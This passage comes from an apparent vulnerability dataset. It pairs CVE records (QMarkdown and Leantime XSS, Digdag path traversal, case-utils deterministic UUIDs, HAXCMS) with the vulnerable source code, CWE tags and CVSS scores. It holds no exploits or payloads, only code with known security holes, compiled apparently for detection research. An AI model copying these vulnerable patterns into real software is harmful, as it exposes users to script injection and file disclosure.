        },
        {
          "line_no": 44,
          "content": "                let fullUrl = '/files/' + file;"
        },
        {
          "line_no": 45,
          "content": "                // multiple sites then append the base url to site management area"
        },
        {
          "line_no": 46,
          "content": "                if (HAXCMS.operatingContext == 'multisite') {"
        },
        {
          "line_no": 47,
          "content": "                  fullUrl = HAXCMS.basePath +"
        },
        {
          "line_no": 48,
          "content": "                  HAXCMS.sitesDirectory + '/' +"
        },
        {
          "line_no": 49,
          "content": "                  site.manifest.metadata.site.name + '/files/' + file"
        },
        {
          "line_no": 51,
          "content": "                files.push({"
        },
        {
          "line_no": 52,
          "content": "                  'path' : 'files/' + file,"
        },
        {
          "line_no": 53,
          "content": "                  'fullUrl' : fullUrl,"
        },
        {
          "line_no": 54,
          "content": "                  'url' : 'files/' + file,"
        },
        {
          "line_no": 55,
          "content": "                  'mimetype' : mime.getType(siteFilePath + '/' + file),"
        },
        {
          "line_no": 56,
          "content": "                  'name' : file"
        },
        {
          "line_no": 57,
          "content": "                });"
        },
        {
          "line_no": 59,
          "content": "            } else {"
        },
        {
          "line_no": 60,
          "content": "                // @todo maybe step into directories?"
        },
        {
          "line_no": 62,
          "content": "          }"
        },
        {
          "line_no": 63,
          "content": "        });"
        }
      ]
    },
    "cwe": [
      "CWE-20",
      "CWE-248",
      "CWE-703"
    ],
    "severity": "HIGH",
    "cvss_score": 7.1,
    "cvss_version": 4.0
  },
  {
    "id": 106,
    "cve": "CVE-2025-43954",
    "description": "QMarkdown (aka quasar-ui-qmarkdown) before 2.0.5 allows XSS via headers even when when no-html is set.",
    "vulnerability": {
      "file_level": [
        {
          "name": "ui/src/util/extendHeading.js",
          "content": "import slugify from './slugify'\n\nfunction unemoji(TokenConstructor, token) {\n  if (token.type === 'emoji') {\n    return Object.assign(new TokenConstructor(), token, { content: token.markup })\n  }\n  return token\n}\n\nexport default function extendHeading(\n  md,\n  tocData = [],\n  toc = false,\n  tocStart = 1,\n  tocEnd = 3,\n  noHeadingAnchorLinks = false,\n) {\n  let Token\n  md.core.ruler.push('headingLinks', function (state) {\n    // save the Token constructor because we'll be building a few instances at render\n    // time; that's sort of outside the intended markdown-it parsing sequence, but\n    // since we have tight control over what we're creating (a link), we're safe\n    if (!Token) {\n      Token = state.Token\n    }\n  })\n\n  md.renderer.rules.heading_open = (tokens, idx, options, env, self) => {\n    const token = tokens[idx]\n\n    // get the token number\n    const tokenNumber = parseInt(token.tag[1])\n\n    const children = tokens[idx + 1].children\n\n    const label = children.reduce((acc, t) => acc + t.content, '')\n\n    const classes = []\n    classes.push('q-markdown--heading')\n    classes.push(`q-markdown--heading-${token.tag}`)\n\n    if (token.markup === '=') {\n      classes.push('q-markdown--title-heavy')\n    } else if (token.markup === '-') {\n      classes.push('q-markdown--title-light')\n    }\n\n    if (\n      noHeadingAnchorLinks !== true &&\n      tocStart &&\n      tocEnd &&\n      tocStart <= tocEnd &&\n      tokenNumber >= tocStart &&\n      tokenNumber <= tocEnd\n    ) {\n      classes.push('q-markdown--heading--anchor-link')\n    }\n\n    const unemojiWithToken = unemoji.bind(null, Token)\n    const renderedLabel = md.renderer.renderInline(children.map(unemojiWithToken), options, env)\n\n    const id = slugify(\n      renderedLabel\n        .replace(/[<>]/g, '') // In case the heading contains `<stuff>`\n        .toLowerCase(), // should be lowercase\n    )\n\n    token.attrSet('id', id)\n    token.attrSet('name', id)\n    token.attrSet('class', classes.join(' '))\n\n    if (toc) {\n      if (\n        tocStart &&\n        tocEnd &&\n        tocStart <= tocEnd &&\n        tokenNumber >= tocStart &&\n        tokenNumber <= tocEnd\n      ) {\n        tocData.push({ id: id, label: label, level: tokenNumber, children: [] })\n      }\n    }\n\n    if (noHeadingAnchorLinks !== true && tokenNumber <= tocEnd) {\n      // add 3 new token objects link_open, text, link_close\n      const linkOpen = new Token('link_open', 'a', 1)\n      const text = new Token('html_inline', '', 0)\n      if (options.enableHeadingLinkIcons) {\n        text.content = options.linkIcon\n      }\n      text.content = label\n\n      const linkClose = new Token('link_close', 'a', -1)\n\n      // add some link attributes\n      // linkOpen.attrSet('id', id)\n      // linkOpen.attrSet('class', '')\n      linkOpen.attrSet('href', '#' + id)\n      linkOpen.attrSet('aria-hidden', 'true')\n\n      // remove previous children\n      while (children.length > 0) children.pop()\n\n      // add new token objects as children of heading\n      children.unshift(linkClose)\n      children.unshift(text)\n      children.unshift(linkOpen)\n\n      return md.renderer.renderToken(tokens, idx, options, env, self)\n    }\n\n    return self.renderToken(tokens, idx, options)\n  }\n}\n"
        }
      ],
      "method_level": [
        "function extendHeading(\n  md,\n  tocData = [],\n  toc = false,\n  tocStart = 1,\n  tocEnd = 3,\n  noHeadingAnchorLinks = false,\n) {\n  let Token\n  md.core.ruler.push('headingLinks', function (state) {\n    // save the Token constructor because we'll be building a few instances at render\n    // time; that's sort of outside the intended markdown-it parsing sequence, but\n    // since we have tight control over what we're creating (a link), we're safe\n    if (!Token) {\n      Token = state.Token\n    }\n  })\n\n  md.renderer.rules.heading_open = (tokens, idx, options, env, self) => {\n    const token = tokens[idx]\n\n    // get the token number\n    const tokenNumber = parseInt(token.tag[1])\n\n    const children = tokens[idx + 1].children\n\n    const label = children.reduce((acc, t) => acc + t.content, '')\n\n    const classes = []\n    classes.push('q-markdown--heading')\n    classes.push(`q-markdown--heading-${token.tag}`)\n\n    if (token.markup === '=') {\n      classes.push('q-markdown--title-heavy')\n    } else if (token.markup === '-') {\n      classes.push('q-markdown--title-light')\n    }\n\n    if (\n      noHeadingAnchorLinks !== true &&\n      tocStart &&\n      tocEnd &&\n      tocStart <= tocEnd &&\n      tokenNumber >= tocStart &&\n      tokenNumber <= tocEnd\n    ) {\n      classes.push('q-markdown--heading--anchor-link')\n    }\n\n    const unemojiWithToken = unemoji.bind(null, Token)\n    const renderedLabel = md.renderer.renderInline(children.map(unemojiWithToken), options, env)\n\n    const id = slugify(\n      renderedLabel\n        .replace(/[<>]/g, '') // In case the heading contains `<stuff>`\n        .toLowerCase(), // should be lowercase\n    )\n\n    token.attrSet('id', id)\n    token.attrSet('name', id)\n    token.attrSet('class', classes.join(' '))\n\n    if (toc) {\n      if (\n        tocStart &&\n        tocEnd &&\n        tocStart <= tocEnd &&\n        tokenNumber >= tocStart &&\n        tokenNumber <= tocEnd\n      ) {\n        tocData.push({ id: id, label: label, level: tokenNumber, children: [] })\n      }\n    }\n\n    if (noHeadingAnchorLinks !== true && tokenNumber <= tocEnd) {\n      // add 3 new token objects link_open, text, link_close\n      const linkOpen = new Token('link_open', 'a', 1)\n      const text = new Token('html_inline', '', 0)\n      if (options.enableHeadingLinkIcons) {\n        text.content = options.linkIcon\n      }\n      text.content = label\n\n      const linkClose = new Token('link_close', 'a', -1)\n\n      // add some link attributes\n      // linkOpen.attrSet('id', id)\n      // linkOpen.attrSet('class', '')\n      linkOpen.attrSet('href', '#' + id)\n      linkOpen.attrSet('aria-hidden', 'true')\n\n      // remove previous children\n      while (children.length > 0) children.pop()\n\n      // add new token objects as children of heading\n      children.unshift(linkClose)\n      children.unshift(text)\n      children.unshift(linkOpen)\n\n      return md.renderer.renderToken(tokens, idx, options, env, self)\n    }\n\n    return self.renderToken(tokens, idx, options)\n  }\n}"
      ],
      "hunk_level": [
        {
          "line_no": 16,
          "content": "  noHeadingAnchorLinks = false,"
        },
        {
          "line_no": 20,
          "content": "    // save the Token constructor because we'll be building a few instances at render"
        },
        {
          "line_no": 21,
          "content": "    // time; that's sort of outside the intended markdown-it parsing sequence, but"
        },
        {
          "line_no": 22,
          "content": "    // since we have tight control over what we're creating (a link), we're safe"
        },
        {
          "line_no": 31,
          "content": "    // get the token number"
        },
        {
          "line_no": 64,
          "content": "        .replace(/[<>]/g, '') // In case the heading contains `<stuff>`"
        },
        {
          "line_no": 65,
          "content": "        .toLowerCase(), // should be lowercase"
        },
        {
          "line_no": 85,
          "content": "      // add 3 new token objects link_open, text, link_close"
        },
        {
          "line_no": 87,
          "content": "      const text = new Token('html_inline', '', 0)"
        },
        {
          "line_no": 88,
          "content": "      if (options.enableHeadingLinkIcons) {"
        },
        {
          "line_no": 89,
          "content": "        text.content = options.linkIcon"
        },
        {
          "line_no": 90,
          "content": "      }"
        },
        {
          "line_no": 91,
          "content": "      text.content = label"
        },
        {
          "line_no": 93,
          "content": "      const linkClose = new Token('link_close', 'a', -1)"
        },
        {
          "line_no": 95,
          "content": "      // add some link attributes"
        },
        {
          "line_no": 96,
          "content": "      // linkOpen.attrSet('id', id)"
        },
        {
          "line_no": 97,
          "content": "      // linkOpen.attrSet('class', '')"
        },
        {
          "line_no": 101,
          "content": "      // remove previous children"
        },
        {
          "line_no": 102,
          "content": "      while (children.length > 0) children.pop()"
        },
        {
          "line_no": 104,
          "content": "      // add new token objects as children of heading"
        },
        {
          "line_no": 105,
          "content": "      children.unshift(linkClose)"
        },
        {
          "line_no": 106,
          "content": "      children.unshift(text)"
        },
        {
          "line_no": 107,
          "content": "      children.unshift(linkOpen)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.9,
    "cvss_version": 3.1
  },
  {
    "id": 287,
    "cve": "CVE-2024-25125",
    "description": "Digdag is an open source tool that to build, run, schedule, and monitor complex pipelines of tasks across various platforms. Treasure Data's digdag workload automation system is susceptible to a path traversal vulnerability if it's configured to store log files locally. This issue may lead to information disclosure and has been addressed in release version 0.10.5.1. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "digdag-core/src/main/java/io/digdag/core/log/LocalFileLogServerFactory.java",
          "content": "package io.digdag.core.log;\n\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.IOException;\nimport java.io.FileNotFoundException;\nimport java.time.Instant;\nimport java.nio.file.FileSystems;\nimport java.nio.file.Path;\nimport java.nio.file.Files;\nimport java.nio.file.DirectoryStream;\nimport com.google.inject.Inject;\nimport com.google.common.base.Optional;\nimport com.google.common.io.ByteStreams;\nimport io.digdag.commons.ThrowablesUtil;\nimport io.digdag.core.agent.AgentId;\nimport io.digdag.spi.LogServer;\nimport io.digdag.spi.LogServerFactory;\nimport io.digdag.spi.LogFilePrefix;\nimport io.digdag.spi.DirectUploadHandle;\nimport io.digdag.spi.StorageFileNotFoundException;\nimport io.digdag.client.config.Config;\n\nimport static java.nio.charset.StandardCharsets.UTF_8;\n\npublic class LocalFileLogServerFactory\n    implements LogServerFactory\n{\n    private static final String LOG_GZ_FILE_SUFFIX = \".log.gz\";\n\n    private final Path logPath;\n    private final long logSplitSize;\n    private final AgentId agentId;\n\n    @Inject\n    public LocalFileLogServerFactory(Config systemConfig, AgentId agentId)\n    {\n        this.logPath = FileSystems.getDefault().getPath(systemConfig.get(\"log-server.local.path\", String.class, \"digdag.log\"))\n            .toAbsolutePath()\n            .normalize();\n        this.agentId = agentId;\n        this.logSplitSize = systemConfig.get(\"log-server.local.split_size\", Long.class, 0L);\n    }\n\n    @Override\n    public String getType()\n    {\n        return \"local\";\n    }\n\n    @Override\n    public LogServer getLogServer()\n    {\n        try {\n            return new LocalFileLogServer(logPath);\n        }\n        catch (IOException ex) {\n            throw ThrowablesUtil.propagate(ex);\n        }\n    }\n\n    class LocalFileLogServer\n            extends AbstractFileLogServer\n    {\n        private final Path logPath;\n        private final ReentrantReadWriteLock lock;\n        private final ReentrantReadWriteLock.ReadLock logAppendLock;\n\n        public LocalFileLogServer(Path logPath)\n            throws IOException\n        {\n            this.logPath = logPath;\n            this.lock = new ReentrantReadWriteLock();\n            this.logAppendLock = lock.readLock();\n        }\n\n        @Override\n        public Optional<DirectUploadHandle> getDirectUploadHandle(String dateDir, String attemptDir, String fileName)\n        {\n            return Optional.absent();\n        }\n\n        @Override\n        protected void putFile(String dateDir, String attemptDir, String fileName, byte[] gzData)\n        {\n            Path dir = getPrefixDir(dateDir, attemptDir);\n            try {\n                Files.createDirectories(dir);\n                Path path = dir.resolve(fileName);\n                try (OutputStream out = Files.newOutputStream(path)) {\n                    out.write(gzData);\n                }\n            }\n            catch (IOException ex) {\n                throw ThrowablesUtil.propagate(ex);\n            }\n        }\n\n        @Override\n        protected void listFiles(String dateDir, String attemptDir, boolean enableDirectDownload, FileMetadataConsumer consumer)\n        {\n            Path dir = getPrefixDir(dateDir, attemptDir);\n            if (!Files.exists(dir)) {\n                return;\n            }\n\n            try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir)) {\n                for (Path path : ds) {\n                    consumer.accept(\n                            path.getFileName().toString(),\n                            Files.size(path),\n                            null);\n                }\n            }\n            catch (IOException ex) {\n                throw ThrowablesUtil.propagate(ex);\n            }\n        }\n\n        @Override\n        protected byte[] getFile(String dateDir, String attemptDir, String fileName)\n            throws StorageFileNotFoundException\n        {\n            Path path = getPrefixDir(dateDir, attemptDir).resolve(fileName);\n            try (InputStream in = Files.newInputStream(path)) {\n                return ByteStreams.toByteArray(in);\n            }\n            catch (FileNotFoundException ex) {\n                throw new StorageFileNotFoundException(ex);\n            }\n            catch (IOException ex) {\n                throw ThrowablesUtil.propagate(ex);\n            }\n        }\n\n        private Path getPrefixDir(String dateDir, String attemptDir)\n        {\n            return logPath.resolve(dateDir).resolve(attemptDir);\n        }\n\n        public LocalFileDirectTaskLogger newDirectTaskLogger(LogFilePrefix prefix, String taskName)\n        {\n            try {\n                return new LocalFileDirectTaskLogger(prefix, taskName, logSplitSize);\n            }\n            catch (IOException ex) {\n                throw ThrowablesUtil.propagate(ex);\n            }\n        }\n\n        class LocalFileDirectTaskLogger\n            implements TaskLogger\n        {\n            private CountingLogOutputStream output;\n            private final long splitSize;\n\n            private final Path dir;\n            private final String taskName;\n\n            public LocalFileDirectTaskLogger(LogFilePrefix prefix, String taskName, Long splitSize)\n                throws IOException\n            {\n                String dateDir = LogFiles.formatDataDir(prefix);\n                String attemptDir = LogFiles.formatSessionAttemptDir(prefix);\n                this.dir = getPrefixDir(dateDir, attemptDir);\n                this.taskName = taskName;\n\n                this.splitSize = splitSize;\n\n                this.output = openNewFile();\n            }\n\n            private CountingLogOutputStream openNewFile()\n                    throws IOException\n            {\n                String fileName = LogFiles.formatFileName(taskName, Instant.now(), agentId.toString());\n                Files.createDirectories(dir);\n                Path path = dir.resolve(fileName);\n                return new CountingLogOutputStream(path);\n            }\n\n            @Override\n            public void log(LogLevel level, long timestamp, String message)\n            {\n                byte[] data = message.getBytes(UTF_8);\n                log(data, 0, data.length);\n            }\n\n            @Override\n            public synchronized void log(byte[] data, int off, int len)\n            {\n                try {\n                    if (output == null) {\n                        output = openNewFile();\n                    }\n                    else if (splitSize > 0 && output.getUncompressedSize() > splitSize) {\n                        output.close();\n                        output = null;\n                        output = openNewFile();\n                    }\n                    output.write(data, off, len);\n                }\n                catch (IOException ex) {\n                    // here can do almost nothing. adding logs to logger causes infinite loop\n                    throw ThrowablesUtil.propagate(ex);\n                }\n            }\n\n            @Override\n            public synchronized void close()\n            {\n                try {\n                    output.close();\n                }\n                catch (IOException ex) {\n                    throw ThrowablesUtil.propagate(ex);\n                }\n            }\n        }\n    }\n}\n"
        }
      ],
      "method_level": [
        "@Override\n        protected byte[] getFile(String dateDir, String attemptDir, String fileName)\n            throws StorageFileNotFoundException\n        {\n            Path path = getPrefixDir(dateDir, attemptDir).resolve(fileName);\n            try (InputStream in = Files.newInputStream(path)) {\n                return ByteStreams.toByteArray(in);\n            }\n            catch (FileNotFoundException ex) {\n                throw new StorageFileNotFoundException(ex);\n            }\n            catch (IOException ex) {\n                throw ThrowablesUtil.propagate(ex);\n            }\n        }"
      ],
      "hunk_level": [
        {
          "line_no": 125,
          "content": "            Path path = getPrefixDir(dateDir, attemptDir).resolve(fileName);"
        },
        {
          "line_no": 129,
          "content": "            catch (FileNotFoundException ex) {"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 86,
    "cve": "CVE-2025-28254",
    "description": "Cross Site Scripting vulnerability in Leantime v3.2.1 and before allows an authenticated attacker to execute arbitrary code and obtain sensitive information via the first name field in processMentions().",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Domain/Notifications/Services/Notifications.php",
          "content": "<?php\n\nnamespace Leantime\\Domain\\Notifications\\Services {\n\n    use DOMDocument;\n    use Illuminate\\Contracts\\Container\\BindingResolutionException;\n    use Leantime\\Core\\Db\\Db as DbCore;\n    use Leantime\\Core\\Language as LanguageCore;\n    use Leantime\\Core\\Mailer as MailerCore;\n    use Leantime\\Domain\\Notifications\\Repositories\\Notifications as NotificationRepository;\n    use Leantime\\Domain\\Users\\Repositories\\Users as UserRepository;\n\n    /**\n     * @api\n     */\n    class Notifications\n    {\n        private DbCore $db;\n\n        private NotificationRepository $notificationsRepo;\n\n        private UserRepository $userRepository;\n\n        private LanguageCore $language;\n\n        /**\n         * __construct - get database connection\n         *\n         *\n         * @api\n         */\n        public function __construct(\n            DbCore $db,\n            NotificationRepository $notificationsRepo,\n            UserRepository $userRepository,\n            LanguageCore $language\n        ) {\n            $this->db = $db;\n            $this->notificationsRepo = $notificationsRepo;\n            $this->userRepository = $userRepository;\n            $this->language = $language;\n        }\n\n        /**\n         * @api\n         */\n        /**\n         * @api\n         */\n        public function getAllNotifications($userId, int $showNewOnly = 0, int $limitStart = 0, int $limitEnd = 100, array $filterOptions = []): false|array\n        {\n\n            return $this->notificationsRepo->getAllNotifications($userId, $showNewOnly, $limitStart, $limitEnd, $filterOptions);\n        }\n\n        /**\n         * @api\n         */\n        public function addNotifications(array $notifications): ?bool\n        {\n\n            return $this->notificationsRepo->addNotifications($notifications);\n        }\n\n        /**\n         * @api\n         */\n        /**\n         * @api\n         */\n        public function markNotificationRead($id, $userId): bool\n        {\n\n            if ($id == 'all') {\n                return $this->notificationsRepo->markAllNotificationRead($userId);\n            } else {\n                return $this->notificationsRepo->markNotificationRead($id);\n            }\n        }\n\n        /**\n         * @throws BindingResolutionException\n         *\n         * @api\n         */\n        public function processMentions(string $content, string $module, int $moduleId, int $authorId, string $url): void\n        {\n\n            $dom = new DOMDocument;\n\n            //Content may not be well formatted. Suppress warnings.\n            @$dom->loadHTML($content);\n            $links = $dom->getElementsByTagName('a');\n\n            $author = $this->userRepository->getUser($authorId);\n            $authorName = $author['firstname'] ?? $this->language->__('label.team_mate');\n\n            for ($i = 0; $i < $links->count(); $i++) {\n                $taggedUser = $links->item($i)->getAttribute('data-tagged-user-id');\n\n                if ($taggedUser !== '' && is_numeric($taggedUser)) {\n                    //Check if user was mentioned before\n                    $userMentions = $this->getAllNotifications(\n                        $taggedUser,\n                        false,\n                        0,\n                        10,\n                        ['type' => 'mention', 'module' => $module, 'moduleId' => $moduleId]\n                    );\n\n                    if ($userMentions === false || (is_array($userMentions) && count($userMentions) == 0)) {\n                        $notification = [\n                            'userId' => $taggedUser,\n                            'read' => '0',\n                            'type' => 'mention',\n                            'module' => $module,\n                            'moduleId' => $moduleId,\n                            'message' => sprintf($this->language->__('text.x_mentioned_you'), $authorName),\n                            'datetime' => date('Y-m-d H:i:s'),\n                            'url' => $url,\n                            'authorId' => $authorId,\n                        ];\n\n                        $this->addNotifications([$notification]);\n\n                        //send email\n                        $mailer = app()->make(MailerCore::class);\n                        $mailer->setContext('notify_project_users');\n\n                        $subject = sprintf($this->language->__('text.x_mentioned_you'), $authorName);\n                        $mailer->setSubject($subject);\n\n                        $emailMessage = $subject.' '.sprintf($this->language->__('text.click_here'), $url);\n                        $mailer->setHtml($emailMessage);\n\n                        $taggedUserObject = $this->userRepository->getUser($taggedUser);\n                        if (isset($taggedUserObject['username'])) {\n                            $mailer->sendMail([$taggedUserObject['username']], $authorName);\n                        }\n                    }\n                }\n            }\n        }\n    }\n\n}\n"
        }
      ],
      "method_level": [
        "public function processMentions(string $content, string $module, int $moduleId, int $authorId, string $url): void\n        {\n\n            $dom = new DOMDocument;\n\n            //Content may not be well formatted. Suppress warnings.\n            @$dom->loadHTML($content);\n            $links = $dom->getElementsByTagName('a');\n\n            $author = $this->userRepository->getUser($authorId);\n            $authorName = $author['firstname'] ?? $this->language->__('label.team_mate');\n\n            for ($i = 0; $i < $links->count(); $i++) {\n                $taggedUser = $links->item($i)->getAttribute('data-tagged-user-id');\n\n                if ($taggedUser !== '' && is_numeric($taggedUser)) {\n                    //Check if user was mentioned before\n                    $userMentions = $this->getAllNotifications(\n                        $taggedUser,\n                        false,\n                        0,\n                        10,\n                        ['type' => 'mention', 'module' => $module, 'moduleId' => $moduleId]\n                    );\n\n                    if ($userMentions === false || (is_array($userMentions) && count($userMentions) == 0)) {\n                        $notification = [\n                            'userId' => $taggedUser,\n                            'read' => '0',\n                            'type' => 'mention',\n                            'module' => $module,\n                            'moduleId' => $moduleId,\n                            'message' => sprintf($this->language->__('text.x_mentioned_you'), $authorName),\n                            'datetime' => date('Y-m-d H:i:s'),\n                            'url' => $url,\n                            'authorId' => $authorId,\n                        ];\n\n                        $this->addNotifications([$notification]);\n\n                        //send email\n                        $mailer = app()->make(MailerCore::class);\n                        $mailer->setContext('notify_project_users');\n\n                        $subject = sprintf($this->language->__('text.x_mentioned_you'), $authorName);\n                        $mailer->setSubject($subject);\n\n                        $emailMessage = $subject.' '.sprintf($this->language->__('text.click_here'), $url);\n                        $mailer->setHtml($emailMessage);\n\n                        $taggedUserObject = $this->userRepository->getUser($taggedUser);\n                        if (isset($taggedUserObject['username'])) {\n                            $mailer->sendMail([$taggedUserObject['username']], $authorName);\n                        }\n                    }\n                }\n            }\n        }"
      ],
      "hunk_level": [
        {
          "line_no": 96,
          "content": "            $authorName = $author['firstname'] ?? $this->language->__('label.team_mate');"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 67,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# Portions of this file contributed by NIST are governed by the following\n# statement:\n#\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to Title 17 Section 105 of the\n# United States Code, this software is not subject to copyright\n# protection within the United States. NIST assumes no responsibility\n# whatsoever for its use by other parties, and makes no guarantees,\n# expressed or implied, about its quality, reliability, or any other\n# characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\nThe function local_uuid() should be used in code where a user could be expected to opt in to non-random UUIDs.\n\"\"\"\n\n__version__ = \"0.4.0\"\n\n__all__ = [\"configure\", \"local_uuid\"]\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef _demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    This function is not intended to be called outside of this module.  Instead, local_uuid() should be called.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, two setup steps need to be done before calling this function:\n\n    * An environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    * The configure() function in this module must be called.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return _demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = 